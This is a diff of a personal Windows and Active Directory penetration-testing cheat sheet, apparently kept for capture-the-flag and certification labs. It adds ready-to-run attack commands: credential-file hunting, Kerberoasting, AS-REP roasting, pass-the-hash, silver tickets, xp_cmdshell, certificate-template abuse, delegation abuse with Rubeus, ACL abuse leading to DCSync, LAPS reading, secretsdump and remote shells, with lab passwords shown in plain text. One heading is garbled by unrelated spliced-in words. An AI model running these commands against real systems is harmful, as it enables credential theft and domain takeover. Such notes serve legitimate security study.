@@ -20,6 +20,8 @@ There are several key pieces of information we should always obtain:
 > net user steve
 > Get-ChildItem Env: # Environment Variables
 > $env:appkey
+> cd env:appkey
+> dir # Check for USERPROFILE
 > Get-LocalUser
 > Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
 > Get-LocalGroupMember adminteam
@@ -50,12 +52,13 @@ There are several key pieces of information we should always obtain:
 # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,SYSTEM,SAM,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include SYSTEM,SAM,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
+> findstr /i /s "pass*" *.txt
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
 > LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
@@ -122,6 +125,8 @@ powershell -ep bypass
 > Get-NetUser -SPN | select samaccountname,serviceprincipalname
 # See if we can perform an AS-REP Roast on any users
 > Get-NetUser -PreauthNotRequired
+# Get Kerberoastable Users
+> Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
 # Attempt to resolve SPN's IP
 > nslookup.exe web04.corp.com # Typically located in C:\Tools\
 # Enumerate ACEs, filtering on an identity
@@ -147,7 +152,10 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 ```bash
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "dev04-leon" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
+
+# Or remotely
+> bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
 ```
 
 ```bash
@@ -185,6 +193,16 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell c
 ```
 
 and execute a reverse shell to get onto the system as them.
+
+#### winexe & pth-winexe
+
+If runas doesn't seem to be working, this is an alternative.
+
+```bash
+winexe -U jenkins/administrator //$ip cmd.exe
+pth-winexe -U jenkins/administrator //$ip cmd.exe
+# pth-wmic & pth-wmis
+```
 
 #### Look out for SeManageVolumePrivilege
 
@@ -242,6 +260,7 @@ Use this command to run as another user (if you have their credentials):
 
 ```bash
 >  runas /user:domainname\\username cmd.exe
+> cmd.exe /c echo REGGIE1234ronnie | runas /u:sequel\\ryan.cooper whoami
 ```
 
 Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM. 
@@ -390,6 +409,8 @@ kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pe
 kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
+Manual version in case Rubeus doesn't work, "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting".
+
 Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 
 
 #### Silver Tickets
@@ -418,6 +439,13 @@ corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105
 mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 ...
 mimikatz # exit
+
+# or
+
+ticketer.py -nthash <spn nltm hash> -domain-sid <domain sid> -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
+KRB5CCNAME=administrator.ccache mssqlclient.py  -k administrator@dc.sequel.htb
+> enable_xp_cmdshell
+> xp_cmdshell whoami
 ```
 
 We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:
@@ -571,7 +599,7 @@ Search in \\web02.medtech.com\sysvol\medtech.com\policies\*.xml, C:\ProgramData\
 
 #### NTLM v NTLMv2
 
-NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed.
+NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed. You must crack them. If you're on a machine without knowing their password, using responder is a great idea.
 
 
 #### Execution Policy Bypass - Per User Basis
@@ -720,6 +748,8 @@ If you have the SeShutDownPrivilege, then restart the computer.
 
 ```bash
 shutdown /r /t 0
+# as alternative
+shutdown -r -t 1
 ```
 
 Once you're back, confirm that everything went as planned.
@@ -1014,6 +1044,12 @@ lsadump::cache
 
 If you see a username with a "$" at the end, this is a machine account, and cracking these passwords are infeasable at the moment. Look for service to be in Users OU, not Servers.
 
+Impacket's secretsdump is a great alternative if you can't run mimikatz.
+
+```bash
+secretsdump.py htb.local/hacker:Hacker123\!@$ip
+```
+
 #### CrackMapExec 
 
 To see if anybody has the same hash or password on another computer in the network:
@@ -1195,13 +1231,13 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:172.16.173.7"
  ```
 
- #### Pass the Hash
+#### Pass the Hash
 
- If you can't crack the NTLM hash, you can always pass it. This resource walks you through it, 'https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash'. 
+If you can't crack the NTLM hash, you can always pass it. This resource walks you through it, 'https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash'. 
 
- #### Other Resources
+#### Other Resources
 
- "https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash"
+"https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash"
 
  #### Recursively Look for a Word
 
@@ -1210,7 +1246,7 @@ Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Selec
 Get-ChildItem -Path . -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
 ```
 
-#### For Modifiable Executables but Unknown Process, Watch What's Going on
+#### For Modifiable Executables but Unknown Pronadal vs djokovic 2012 french opencess, Watch What's Going on
 
 ```bash
 Get-Process | Watch-Command -Difference -Continuous -Verbose
@@ -1498,3 +1534,153 @@ Credentials:
 ...
 kali@kali: impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
 ````
+
+#### Exploiting Certificate Authority
+
+If LDAP is open, you can try to connect to LDAP through your browser, 'https:10.10.11.202:3269/', and check whether the box is a certificate authority. If it is, you can upload Certify.exe to the machine once you have initial access and exploit it.
+
+You can also see it when you run winpeas towards the end in the certificate section. 
+
+```bash
+certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
+```
+
+```bash
+# Taken from Certify's Github Page
+.\Certify.exe find /vulnerable
+.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:adminstrator /outfile:C:\Windows\Tasks\cert.pem
+
+# Paste the RSA PRIVATE KEY in cert.pem file
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### GenericAll Exploitation & Using Kerberos Ticket
+
+I discovered this path in BloodHound.
+
+```bash
+. .\Powermad.ps1
+. .\PowerView.ps1
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer attackersystem | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+.\Rubeus.exe hash /password:Summer2018!
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/attackersystem.support.htb /ptt
+
+# Copy the Base 64 ticket output and transfer it to Windows (because I'm in evil-winrm and using it within Windows isn't working). Remove all spaces in vi with '%s/ //g', decode the base64, then use ticketConverter.py to convert the ticket to a .ccache file that we can use to login as adminsitrator.
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+ticketConverter.py ticket.kirbi ticket.ccache
+KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+
+# You could also use smbexec.py, wmiexec.py, atexec.py, dcomexec.py from Linux to authenticate
+
+# On Windows
+Once you get ticket, to access drive as admin.
+>net use O: \\dc.help.htb\C$
+>O:
+```
+
+Alternatively:
+
+```bash
+net user hacker Hacker123! /add /domain
+# Target Group
+net group "EXCHANGE WINDOWS PERMISSIONS" /add hacker
+```
+
+#### WriteOwner Exploitation
+
+I discovered this path in BloodHound.
+
+```bash
+# The user's password that you're exploiting with
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDGodd', $SecPassword)
+# TargetIdentity is the group that you're targeting
+Set-DomainObjectOwner -Identity "Core Staff" -OwnerIdentity JDGodd -Credential $Cred
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity JDGodd
+#Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -Rights WriteMembers
+# Members is who you want to add, user that you have a shell with
+Add-DomainGroupMember -Identity 'Core Staff' -Members 'nikk37' -Credential $Cred
+Get-DomainGroupMember -Identity 'Core Staff'
+#Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers
+```
+
+#### WriteDacl Exploitation
+
+I discovered this path in BloodHound.
+
+```bash
+$SecPassword = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+lsadump::dcsync /domain:htb.local /user:Administrator
+# Or
+/opt/windows/DCSync/DCSync.py -dc htb.local -t 'CN=hacker,CN=Users,DC=htb,DC=local'  hackerAdministrator:Hacker123!
+secretsdump.py htb.local/hacker:Hacker123\!@$ip
+```
+
+#### Read LAPS
+
+```bash
+# Valid credentials for your user that you have a shell with
+$SecPassword = ConvertTo-SecureString 'get_dem_girls2@yahoo.com' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\nikk37', $SecPassword)
+Get-DomainObject DC -Credential $Cred -Properties "ms-mcs-AdmPwd",name
+#Get-ADComputer DC -Properties ms-msc-admpwd
+```
+
+#### Impacket Attacks
+
+Get users:
+
+```bash
+impacket-GetADUsers -dc-ip $ip "exampleH.example/" -all
+impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
+```
+
+AS-REP Roasting:
+
+```bash
+# Searches for all vulnerable users
+GetNPUsers.py "EGOTISTICAL-BANK.LOCAL/fsmith"
+GetNPUsers.py help.htb/ -dc-ip $ip -request
+GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip 'DOMAIN/'
+```
+
+Kerberoasting:
+
+```bash
+impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip 'DOMAIN/'
+impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip example.com/user:password
+```
+
+Dump hashes for users, needs admin or sam/security/system files:
+
+```bash
+impacket-secretsdump admin:password@$ip -outputfile hashes
+/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
+```
+
+WMI shell:
+
+```bash
+impacket-wmiexec forest/bob:'password'@$ip
+```
+
+SMB shell:
+
+```bash
+smbexec.py test.local/john:password123@$ip
+```
+
+#### ntpdate
+
+Whenever you're pentesting a windows network or computer, just fucking take the time to run:
+
+```bash
+sudo ntpdate $ip
+```
